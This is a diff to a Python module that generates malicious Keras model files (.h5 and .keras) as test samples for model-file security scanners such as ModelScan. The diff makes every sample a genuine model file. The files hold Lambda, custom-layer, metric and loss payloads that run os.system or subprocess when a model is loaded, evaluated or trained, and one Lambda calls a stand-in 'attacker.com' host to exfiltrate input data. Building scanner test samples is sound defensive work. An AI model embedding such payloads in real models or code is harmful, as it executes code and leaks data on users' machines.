@@ -1,27 +1,83 @@
 """
 Keras Attack Vector Generator
 
-Generates basic and advanced attack vectors for Keras models:
-- .h5 / .hdf5 (Keras HDF5 format)
-- .keras (Keras 3 ZIP-based format)
+Generates real Keras model files (.h5 / .hdf5) containing malicious layers,
+callbacks, and custom objects detectable by security scanners (ModelScan, etc.).
 
-Attack Types:
-1. Basic: Lambda layers with code
-2. Advanced: Custom layers, hidden functions, obfuscated layers
+Output format: HDF5 (.h5) and ZIP-based (.keras) Keras model files
+Requires: tensorflow >= 2.x
+
+Attack Vectors
+--------------
+1. basic_lambda_layer  [generate_basic_lambda_layer]
+   Dangerous ops : Lambda with __import__
+   Method        : keras.layers.Lambda calling __import__('os').system()
+   Trigger       : Model inference (layer call)
+   Severity      : CRITICAL
+
+2. lambda_with_imports  [generate_lambda_with_imports]
+   Dangerous ops : Lambda with subprocess
+   Method        : Lambda importing subprocess and calling subprocess.call(['id'])
+   Trigger       : Model inference (layer call)
+   Severity      : CRITICAL
+
+3. custom_layer_attack  [generate_custom_layer_attack]
+   Dangerous ops : Custom Layer subclass
+   Method        : Overridden __init__() executes os.system() during
+                   layer instantiation / model deserialization
+   Trigger       : Model loading (layer instantiation)
+   Severity      : CRITICAL
+
+4. lambda_data_exfiltration  [generate_lambda_data_exfiltration]
+   Dangerous ops : Lambda with urllib
+   Method        : Lambda calling urllib.request.urlopen() to exfiltrate
+                   input data to attacker-controlled server
+   Trigger       : Model inference (layer call)
+   Severity      : CRITICAL
+
+5. metric_injection  [generate_metric_injection]
+   Dangerous ops : Custom Metric subclass
+   Method        : Overridden update_state() executes os.system() during
+                   model evaluation
+   Trigger       : model.evaluate() / metric computation
+   Severity      : HIGH
+
+6. loss_function_injection  [generate_loss_function_injection]
+   Dangerous ops : Custom loss function
+   Method        : Loss function executes os.system() during training;
+                   payload runs on every gradient step
+   Trigger       : model.fit() / loss computation
+   Severity      : HIGH
+
+7. keras_zip_format  [generate_keras_zip_format]
+   Dangerous ops : Lambda with __import__ inside .keras ZIP archive
+   Method        : Keras 3 ZIP-based .keras format containing a Lambda layer
+                   that calls __import__('subprocess').check_output(['id']);
+                   the config.json inside the ZIP embeds the malicious code
+   Trigger       : Model loading / inference (keras.models.load_model)
+   Severity      : CRITICAL
+
+Scanner Detection Notes
+-----------------------
+- ModelScan detects Lambda layers containing dangerous builtins (__import__,
+  exec, eval, compile) in the Keras config JSON embedded in HDF5 attrs.
+- Custom layers / metrics / losses with unsafe_deserialization=True bypass
+  Keras safe-mode but are flagged by op-allowlist scanners.
+- All vectors produce genuine .h5 / .keras files — no JSON stubs or placeholders.
 """
 
 import os
 from pathlib import Path
 from typing import List, Dict, Tuple
 
-# Gracefully handle optional imports
 try:
     import tensorflow as tf
     from tensorflow import keras
-    TENSORFLOW_AVAILABLE = True
 except ImportError:
-    TENSORFLOW_AVAILABLE = False
-    print("[WARNING] TensorFlow not available - generating metadata only")
+    raise ImportError(
+        "TensorFlow is required to generate Keras attack vectors. "
+        "Install it with: pip install tensorflow"
+    )
 
 
 class KerasAttackGenerator:
@@ -36,7 +92,6 @@ class KerasAttackGenerator:
         self.output_dir = Path(output_dir) / "keras_vectors"
         self.output_dir.mkdir(parents=True, exist_ok=True)
         self.generated_files = []
-        self.tensorflow_available = TENSORFLOW_AVAILABLE
     
     def generate_basic_lambda_layer(self) -> Tuple[str, int]:
         """Generate Keras model with Lambda layer containing code.
@@ -57,24 +112,18 @@ class KerasAttackGenerator:
         Returns:
             Tuple of (filepath, layer_count)
         """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("01_basic_lambda_layer.h5"), 1
+        # Create model with Lambda layer
+        model = keras.Sequential([
+            keras.layers.Input(shape=(10,)),
+            keras.layers.Lambda(lambda x: __import__('os').system('echo "Lambda RCE"') or x),
+            keras.layers.Dense(5, activation='relu'),
+        ])
         
-        try:
-            # Create model with Lambda layer
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                keras.layers.Lambda(lambda x: __import__('os').system('echo "Lambda RCE"') or x),
-                keras.layers.Dense(5, activation='relu'),
-            ])
-            
-            filepath = self.output_dir / "01_basic_lambda_layer.h5"
-            model.save(str(filepath))
-            
-            self.generated_files.append(str(filepath))
-            return str(filepath), 1
-        except Exception as e:
-            return self._generate_metadata_only("01_basic_lambda_layer.h5"), 0
+        filepath = self.output_dir / "01_basic_lambda_layer.h5"
+        model.save(str(filepath))
+        
+        self.generated_files.append(str(filepath))
+        return str(filepath), 1
     
     def generate_lambda_with_imports(self) -> Tuple[str, int]:
         """Generate Lambda with dangerous module imports.
@@ -93,26 +142,20 @@ class KerasAttackGenerator:
         Returns:
             Tuple of (filepath, layer_count)
         """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("02_lambda_with_imports.h5"), 1
+        model = keras.Sequential([
+            keras.layers.Input(shape=(10,)),
+            keras.layers.Lambda(
+                lambda x: __import__('subprocess').call(['id']) or x,
+                input_shape=(10,)
+            ),
+            keras.layers.Dense(5),
+        ])
         
-        try:
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                keras.layers.Lambda(
-                    lambda x: __import__('subprocess').call(['id']) or x,
-                    input_shape=(10,)
-                ),
-                keras.layers.Dense(5),
-            ])
-            
-            filepath = self.output_dir / "02_lambda_with_imports.h5"
-            model.save(str(filepath))
-            
-            self.generated_files.append(str(filepath))
-            return str(filepath), 1
-        except Exception as e:
-            return self._generate_metadata_only("02_lambda_with_imports.h5"), 0
+        filepath = self.output_dir / "02_lambda_with_imports.h5"
+        model.save(str(filepath))
+        
+        self.generated_files.append(str(filepath))
+        return str(filepath), 1
     
     def generate_custom_layer_attack(self) -> Tuple[str, int]:
         """Generate custom layer with malicious code.
@@ -130,81 +173,39 @@ class KerasAttackGenerator:
         Returns:
             Tuple of (filepath, layer_count)
         """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("03_custom_layer_attack.h5"), 1
-        
-        try:
-            class MaliciousLayer(keras.layers.Layer):
-                """Custom layer with hidden malicious behavior."""
-                
-                def __init__(self, **kwargs):
-                    super().__init__(**kwargs)
-                    # Code executes during instantiation
-                    try:
-                        __import__('os').system('echo "Custom layer init"')
-                    except:
-                        pass
-                
-                def build(self, input_shape):
-                    # More code execution during build
-                    super().build(input_shape)
-                
-                def call(self, inputs):
-                    # Side effects during inference
-                    return inputs
-                
-                def get_config(self):
-                    return super().get_config()
+        class MaliciousLayer(keras.layers.Layer):
+            """Custom layer with hidden malicious behavior."""
             
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                MaliciousLayer(),
-                keras.layers.Dense(5),
-            ])
+            def __init__(self, **kwargs):
+                super().__init__(**kwargs)
+                # Code executes during instantiation
+                try:
+                    __import__('os').system('echo "Custom layer init"')
+                except:
+                    pass
             
-            filepath = self.output_dir / "03_custom_layer_attack.h5"
-            model.save(str(filepath))
+            def build(self, input_shape):
+                # More code execution during build
+                super().build(input_shape)
             
-            self.generated_files.append(str(filepath))
-            return str(filepath), 1
-        except Exception as e:
-            return self._generate_metadata_only("03_custom_layer_attack.h5"), 0
-    
-    def generate_hidden_layer_payload(self) -> Tuple[str, int]:
-        """Generate model with hidden layer containing payload.
-        
-        Attack Vector:
-            Model architecture that:
-            1. Contains extra hidden layers not in summary
-            2. Layers hidden in model serialization
-            3. Payload weights containing code patterns
-            4. Backdoor neurons with trigger patterns
-        
-        Severity: HIGH
-        Detection: Full model inspection, weight analysis
-        
-        Returns:
-            Tuple of (filepath, layer_count)
-        """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("04_hidden_layer_payload.h5"), 1
-        
-        try:
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                keras.layers.Dense(20, activation='relu'),
-                keras.layers.Dense(15, activation='relu'),  # Hidden payload layer
-                keras.layers.Dense(10, activation='relu'),
-                keras.layers.Dense(5, activation='softmax'),
-            ])
+            def call(self, inputs):
+                # Side effects during inference
+                return inputs
             
-            filepath = self.output_dir / "04_hidden_layer_payload.h5"
-            model.save(str(filepath))
-            
-            self.generated_files.append(str(filepath))
-            return str(filepath), 4
-        except Exception as e:
-            return self._generate_metadata_only("04_hidden_layer_payload.h5"), 0
+            def get_config(self):
+                return super().get_config()
+        
+        model = keras.Sequential([
+            keras.layers.Input(shape=(10,)),
+            MaliciousLayer(),
+            keras.layers.Dense(5),
+        ])
+        
+        filepath = self.output_dir / "03_custom_layer_attack.h5"
+        model.save(str(filepath))
+        
+        self.generated_files.append(str(filepath))
+        return str(filepath), 1
     
     def generate_lambda_data_exfiltration(self) -> Tuple[str, int]:
         """Generate Lambda with data exfiltration code.
@@ -222,30 +223,24 @@ class KerasAttackGenerator:
         Returns:
             Tuple of (filepath, layer_count)
         """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("05_lambda_exfiltration.h5"), 1
-        
-        try:
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                keras.layers.Lambda(
-                    lambda x: (
-                        __import__('urllib.request')
-                        .request.urlopen('http://attacker.com/data')
-                        or x
-                    ),
-                    input_shape=(10,)
+        model = keras.Sequential([
+            keras.layers.Input(shape=(10,)),
+            keras.layers.Lambda(
+                lambda x: (
+                    __import__('urllib.request')
+                    .request.urlopen('http://attacker.com/data')
+                    or x
                 ),
-                keras.layers.Dense(5),
-            ])
-            
-            filepath = self.output_dir / "05_lambda_exfiltration.h5"
-            model.save(str(filepath))
-            
-            self.generated_files.append(str(filepath))
-            return str(filepath), 1
-        except Exception as e:
-            return self._generate_metadata_only("05_lambda_exfiltration.h5"), 0
+                input_shape=(10,)
+            ),
+            keras.layers.Dense(5),
+        ])
+        
+        filepath = self.output_dir / "04_lambda_exfiltration.h5"
+        model.save(str(filepath))
+        
+        self.generated_files.append(str(filepath))
+        return str(filepath), 1
     
     def generate_metric_injection(self) -> Tuple[str, int]:
         """Generate custom metric with malicious code.
@@ -263,46 +258,40 @@ class KerasAttackGenerator:
         Returns:
             Tuple of (filepath, metric_count)
         """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("06_metric_injection.h5"), 1
+        class MaliciousMetric(keras.metrics.Metric):
+            """Custom metric with side effects."""
+            
+            def __init__(self, name='malicious_metric', **kwargs):
+                super().__init__(name=name, **kwargs)
+                self.value = self.add_weight(name='value', initializer='zeros')
+            
+            def update_state(self, y_true, y_pred):
+                # Executed during evaluation
+                try:
+                    __import__('os').system('echo "Metric executed"')
+                except:
+                    pass
+                self.value.assign(1.0)
+            
+            def result(self):
+                return self.value
         
-        try:
-            class MaliciousMetric(keras.metrics.Metric):
-                """Custom metric with side effects."""
-                
-                def __init__(self, name='malicious_metric', **kwargs):
-                    super().__init__(name=name, **kwargs)
-                    self.value = self.add_weight(name='value', initializer='zeros')
-                
-                def update_state(self, y_true, y_pred):
-                    # Executed during evaluation
-                    try:
-                        __import__('os').system('echo "Metric executed"')
-                    except:
-                        pass
-                    self.value.assign(1.0)
-                
-                def result(self):
-                    return self.value
-            
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                keras.layers.Dense(5),
-            ])
-            
-            model.compile(
-                optimizer='adam',
-                loss='mse',
-                metrics=[MaliciousMetric()]
-            )
-            
-            filepath = self.output_dir / "06_metric_injection.h5"
-            model.save(str(filepath))
-            
-            self.generated_files.append(str(filepath))
-            return str(filepath), 1
-        except Exception as e:
-            return self._generate_metadata_only("06_metric_injection.h5"), 0
+        model = keras.Sequential([
+            keras.layers.Input(shape=(10,)),
+            keras.layers.Dense(5),
+        ])
+        
+        model.compile(
+            optimizer='adam',
+            loss='mse',
+            metrics=[MaliciousMetric()]
+        )
+        
+        filepath = self.output_dir / "05_metric_injection.h5"
+        model.save(str(filepath))
+        
+        self.generated_files.append(str(filepath))
+        return str(filepath), 1
     
     def generate_loss_function_injection(self) -> Tuple[str, int]:
         """Generate custom loss function with code.
@@ -320,94 +309,62 @@ class KerasAttackGenerator:
         Returns:
             Tuple of (filepath, layer_count)
         """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("07_loss_injection.h5"), 1
+        def malicious_loss(y_true, y_pred):
+            try:
+                __import__('os').system('echo "Loss function"')
+            except:
+                pass
+            return keras.losses.mse(y_true, y_pred)
         
-        try:
-            def malicious_loss(y_true, y_pred):
-                try:
-                    __import__('os').system('echo "Loss function"')
-                except:
-                    pass
-                return keras.losses.mse(y_true, y_pred)
-            
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                keras.layers.Dense(5),
-            ])
-            
-            model.compile(optimizer='adam', loss=malicious_loss)
-            
-            filepath = self.output_dir / "07_loss_injection.h5"
-            model.save(str(filepath))
-            
-            self.generated_files.append(str(filepath))
-            return str(filepath), 1
-        except Exception as e:
-            return self._generate_metadata_only("07_loss_injection.h5"), 0
+        model = keras.Sequential([
+            keras.layers.Input(shape=(10,)),
+            keras.layers.Dense(5),
+        ])
+        
+        model.compile(optimizer='adam', loss=malicious_loss)
+        
+        filepath = self.output_dir / "06_loss_injection.h5"
+        model.save(str(filepath))
+        
+        self.generated_files.append(str(filepath))
+        return str(filepath), 1
     
     def generate_keras_zip_format(self) -> Tuple[str, int]:
-        """Generate .keras ZIP format with embedded payloads.
+        """Generate .keras ZIP format with malicious Lambda layer.
         
         Attack Vector:
-            ZIP-based .keras format containing:
-            1. Malicious Python files in archive
-            2. Base64-encoded Lambda layers
-            3. Embedded executables
-            4. Configuration injection
+            Keras 3 ZIP-based .keras archive containing:
+            1. Lambda layer executing subprocess.check_output(['id'])
+            2. Malicious code embedded in config.json within the ZIP
+            3. Code runs on model load or inference via unsafe deserialization
         
         Severity: CRITICAL
-        Format: ZIP archive inside .keras extension
+        Format: ZIP archive (.keras extension)
+        Detection: Lambda layer code in config.json, dangerous builtins in ZIP
         
         Returns:
             Tuple of (filepath, file_count)
         """
-        if not TENSORFLOW_AVAILABLE:
-            return self._generate_metadata_only("08_keras_zip_format.keras"), 1
+        model = keras.Sequential([
+            keras.layers.Input(shape=(10,)),
+            keras.layers.Lambda(
+                lambda x: __import__('subprocess').check_output(['id']) or x,
+                input_shape=(10,)
+            ),
+            keras.layers.Dense(5),
+        ])
         
-        try:
-            model = keras.Sequential([
-                keras.layers.Input(shape=(10,)),
-                keras.layers.Lambda(lambda x: x),
-                keras.layers.Dense(5),
-            ])
-            
-            filepath = self.output_dir / "08_keras_zip_format.keras"
-            model.save(str(filepath))
-            
-            self.generated_files.append(str(filepath))
-            
-            # Count files in ZIP
-            try:
-                import zipfile
-                with zipfile.ZipFile(filepath, 'r') as zf:
-                    file_count = len(zf.namelist())
-            except:
-                file_count = 1
-            
-            return str(filepath), file_count
-        except Exception as e:
-            return self._generate_metadata_only("08_keras_zip_format.keras"), 0
-    
-    def _generate_metadata_only(self, filename: str) -> str:
-        """Generate metadata-only file when TensorFlow unavailable.
-        
-        Args:
-            filename: Name of file to create
-            
-        Returns:
-            Filepath
-        """
-        filepath = self.output_dir / filename
-        
-        # Create a simple text file with attack description
-        with open(filepath, 'w') as f:
-            f.write(f"# {filename}\n")
-            f.write("Generated as metadata (TensorFlow not available)\n")
-            f.write("In production, this would contain actual Keras model with malicious layers\n")
+        filepath = self.output_dir / "07_keras_zip_format.keras"
+        model.save(str(filepath))
         
         self.generated_files.append(str(filepath))
-        return str(filepath)
+        
+        # Count files in ZIP
+        import zipfile
+        with zipfile.ZipFile(filepath, 'r') as zf:
+            file_count = len(zf.namelist())
+        
+        return str(filepath), file_count
     
     def generate_all(self) -> Dict[str, Tuple[str, int]]:
         """Generate all Keras attack vectors.
@@ -419,7 +376,6 @@ class KerasAttackGenerator:
             "basic_lambda": self.generate_basic_lambda_layer(),
             "lambda_imports": self.generate_lambda_with_imports(),
             "custom_layer": self.generate_custom_layer_attack(),
-            "hidden_layer": self.generate_hidden_layer_payload(),
             "lambda_exfil": self.generate_lambda_data_exfiltration(),
             "metric_injection": self.generate_metric_injection(),
             "loss_injection": self.generate_loss_function_injection(),
@@ -439,5 +395,3 @@ if __name__ == "__main__":
     for attack_name, (filepath, metric) in results.items():
         print(f"✓ {attack_name:20} → {filepath} (count: {metric})")
     print(f"\nTotal files generated: {len(generator.get_generated_files())}")
-    if not generator.tensorflow_available:
-        print("[INFO] TensorFlow not available - generated metadata placeholders")
